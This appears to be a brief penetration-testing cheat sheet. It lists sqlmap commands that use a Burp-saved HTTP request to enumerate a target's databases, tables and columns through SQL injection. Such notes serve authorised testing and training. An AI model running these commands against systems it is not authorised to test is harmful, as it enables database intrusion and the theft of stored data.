Enumerate databases

`sqlmap -r <burp saved request> --dbs`

Enumerate tables in database

`sqlmap -r <burp saved request> -D <database> --tables`

Enumerate Columns in table

`sqlmap -r <> -D <database> -T <table> --columns`

